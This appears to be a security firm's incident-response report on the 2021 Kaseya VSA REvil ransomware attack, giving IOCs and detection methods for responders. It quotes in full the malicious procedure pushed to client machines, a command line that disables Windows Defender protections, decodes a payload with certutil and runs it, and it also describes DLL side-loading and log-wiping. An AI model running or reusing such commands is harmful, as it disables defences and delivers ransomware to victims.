We have been investigating this issue and our CSIRT team has been working around the
clock to help affected organizations.
We are thankful for all information that other security researchers and response teams have
been sharing, such as Huntress and Kevin Beaumont. So far, we don’t see any substantial
discrepancy between the results of our investigation and the publicly available IOCs that
have been shared.

Attack Overview

1/7

Kaseya customers using the on-prem VSA server were affected by this attack. The VSA
server is used to manage large fleets of computers and is normally used by MSPs to
manage all their clients. Without separation between client environments, this creates a
dependency: if the VSA server is compromised, all client environments managed from this
server can be compromised too.
Additionally, if the VSA server is exposed to the internet, any potential vulnerability could be
leveraged over the Internet to breach the server. This is what happened in this case. The
threat actor, an affiliate of the REvil ransomware-as-a-service, identified and exploited a
zero-day vulnerability in the VSA server.
The vulnerability was exploited to introduce a malicious script to be sent to all computers
managed by the server, therefore reaching all the end clients. The script delivered the REvil
ransomware and encrypted the systems.

Overview of the attack

VSA Server Zero-Day
We have identified the exploit code used by the threat actor to compromise the Internetfacing VSA servers. Since a patch has been available since July 11, and after we have
validated the patch and verified that the attack vector is no longer present, we published the
details of the exploit in a follow-up technical post.
Thank you Visma for extracting traffic data from your DarkTrace appliances and providing it
to us for investigation.

Truesec has confirmed the complete exploit chain and produced a working proof-ofconcept exploit. The following vulnerabilities were chained in the exploit:
Authentication Bypass
Arbitrary File Upload
Request Forgery Token Bypass
Local File Code Injection

Attack Kill Chain
We want to share an IP address that we have identified, used to launch the exploit:
161[.]35.239.148
User-Agent: curl/7.69.1

Organizations and response teams can use this to identify if exploitation was launched
against the VSA servers. Note that as part of the exploitation, the IIS logs are cleared,
therefore a lack of indications in the IIS logs does not necessarily mean that the system was
not exploited.
At this time, we do not know if the threat actor changed the source IP address for each
exploited VSA server, however, we expect a large overlap.

Part of Exploit Against VSA Server

Malicious Procedure to Clients
The code executed on the VSA server as part of the exploit triggered execution of a
malicious procedure on computers managed by the server. This effectively reaches all
managed clients.
As the first stage deletes logs in multiple locations (IIS logs as well as logs stored in the
application database), not all the steps have been reconstructed yet. However, the procedure
pushed to the clients was recovered and is reported below.
execFile(): Path="C:\windows\system32\cmd.exe", arg="/c ping 127.0.0.1 -n 7615 > nul
& C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Set-MpPreference DisableRealtimeMonitoring $true -DisableIntrusionPreventionSystem $true DisableIOAVProtection $true -DisableScriptScanning $true EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force MAPSReporting Disabled -SubmitSamplesConsent NeverSend & copy /Y

c:\kworking1\agent.exe & del /q /f c:\kworking1\agent.crt C:\Windows\cert.exe &
c:\kworking1\agent.exe", flag=0x00000002, timeout=0 seconds

This disables some features of Windows Defender, uses certutil to decode the previously
uploaded agent.crt to agent.exe, and executes it.

4/7

When executed, agent.exe will drop two additional files: MsMpEng.exe (a legitimate version
of the Windows Defender binary) and mpsvc.dll (REvil ransomware). The execution of
MsMpEng.exe triggers the loading of mpsvc.dll (side-loading execution) and therefore
executes the REvil ransomware in the context of MsMpEng.exe.

Methods to Identify Compromised Systems – Kaseya VSA
Truesec has identified several methods to detect if systems are affected. This is possible
both for a device with a Kaseya agent installed, but also on a central Kaseya VSA server.
Several logs such as the web server and database logs are cleared or deleted on the
Kaseya VSA servers we have investigated. However, we were able to discover at least one
log file that contained valuable data.
In our case, this log file was located at D:\Kaseya\Kserver\Kserver.log”. When inspecting the
content of the file, we were able to find traces of the “agent.crt” file being sent out to systems.
The log for a specific system looks as follows:
[I 2021-07-02T13:59:59.544250Z +02:00 ] [ProcessCmd] Systemname-and-Kaseya-agentdetails (REDACTED) logged in successfully.
[I 2021-07-02T14:00:01.512990Z +02:00 1840 16cc] [EVENT_SERVER] Fri Jul 2 16:00:01
2021: [5836] WARNING: Write File task will rewrite entire file
'#agentWrkDir#\agent.crt' to 'Systemname-and-Kaseya-agent-details' (REDACTED) because
the timestamp of the file on the server has changed.
[I 2021-07-02T14:00:01.559863Z +02:00 1840 12b4] [EVENT_SERVER] Fri Jul 2 16:00:01
2021: [4788] Write File task continuing previous transfer to file
'#agentWrkDir#\agent.crt' at offset 1221800 of 1221802 bytes for 'Systemname-andKaseya-agent-details' (REDACTED). Process time = 0 seconds.

These log entries indicate that an attempt was made to send out the file “agent.crt” to the
working directory (default C:\kworking) of the target machine. As such, it is possible from the
central Kaseya VSA servers to identify which systems were targeted.
We have also confirmed that it is possible that systems are part of the list, and that an
attempt at encrypting them was made, but was unsuccessful.

Methods to Identify Compromised Systems – Systems With Agent
On a device that has a Kaseya agent installed, many different indicators exist. This list
contains several methods which have been relevant in the cases we investigated so far.
ENCRYPTION
The registry key HKLM:\SOFTWARE\Wow6432Node\BlackLivesMatter which contains
information related to the ransomware
5/7

The ransomware “readme” file and files with the same file ending as the “-readme.txt”
noted prefix
ATTEMPTS TO EXECUTE MALICIOUS CODE
It is possible that there was an attempt at executing the malicious code, but where the
execution was unsuccessful. In such cases the following identification methods are valuable:
C:\Windows\System32\winevt\Logs\Windows Powershell.evtx – Check for the
malicious powershell execution “Set-MpPreference -Set-MpPreference DisableRealtimeMonitoring ….”
Any of the files noted in the IoC list. The “C:\kworking” directory is based on the
working directory for the Kaseya agent, which is defined in the registry key
HKLM:\SOFTWARE\Wow6432Node\Kaseya\Agent. Multiple agents can be installed,
and therefore multiple versions of the files.
Signs of the malicious execution in the Kasey AgentMon log located at: C:\Program
Files (x86)\Kaseya\\AgentMon.log”
Running process agent.exe
Running process MsMpEng.exe with loaded mpsvc.dll
We have also released a script to help victims and responders of the Kaseya
ransomware attack to identify and mitigate affected systems. This is for the end
systems, not the VSA servers.

We held a live webinar for approximately 35 minutes to answer many of the questions we
have received.
Due to the nature of the exploit, and the fact that it is zero-day, we are not disclosing any
specific details of the exploit. We have shared the details directly with Kaseya.
EDIT: since a patch has been available since July 11, and after we have validated the patch
and verified that the attack vector is no longer present, we published the details of the
exploit in a follow-up technical post.
